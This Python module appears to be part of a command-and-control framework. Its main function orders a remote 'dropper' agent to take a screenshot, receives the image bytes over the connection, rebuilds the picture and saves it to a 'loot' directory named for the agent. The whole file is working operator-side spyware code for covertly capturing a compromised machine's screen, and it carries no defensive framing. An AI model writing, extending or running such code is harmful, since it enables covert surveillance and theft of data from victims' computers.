import os
import time
import pyscreenshot

from PIL import Image
from base64 import b64decode
from gzip import decompress as degzip
from common import bcolors as bc

def parse_args(agent, args):
    """PArse CLI arguments"""

    #Initial argument setup
    show = None
    settings = {}

    #Get (any) raw args
    if args:
        args = args.split(' ')
        for arg in args:
            if arg == '--show' or arg == '-s':
                show = True

    #rationalise and test arguments into settings dict
    if show:
        settings['show'] = True
    else:
        settings['show'] = False
    return settings

def main(agent, args=None):
    """Order and receive screenshots from dropper, displays if requested"""

    try:
        settings = parse_args(agent, args)
        if not settings:
            bc.err("Error parsing args : {}".format(settings))
            return
        #Setup out-file
        timestamp = time.strftime("-%Y-%m-%d-%H%M%S")
        file_name = agent.listener.loot_dir + 'screenshot' + '-' + agent.name + timestamp + '.png'
        #receive the file!
        gotsz = False
        raw_bytes = b''

        #Get the agent to screenshot
        agent.send('screenshot')
        while True:
            chunk = agent.recv(print_flag=False, blocking=False)
            try:
                if not chunk:
                    continue
                if not gotsz:
                    size = chunk[8:].decode()  #Size tuple as string
                    size = (int(size.split(',')[0]),int(size.split(',')[1]))
                    gotsz=True
                    #print("DEBUG - Img size : {}".format(size))
                elif chunk.endswith(b'<BSEOF>'):
                    raw_bytes += chunk[:-7]
                    break
                else:
                    raw_bytes += chunk
                    #Status info
            except Exception as e:
                bc.err("Download screnshot chunk failed because : {}. Try again?".format(e))
                break

        #Reconstruct the image from raw raw bytesb
        bc.info("Reconstructing image.")
        img = Image.frombytes('RGB', size, raw_bytes)

        if settings['show']:
            img.show()
        img.save(file_name)
        img.close()

        bc.green_print("\n[+] ", "{} - screenshot saved to : {}".format(agent.name, file_name))
    except Exception as e:
        bc.err_print("\n[!] ", "{} Screenshot failed : {}".format(agent.name, e))
        #Flush socket
        chunk = b''
        while b'<BSEOF>' not in chunk:
            chunk = agent.recv(print_flag = False, blocking=False)
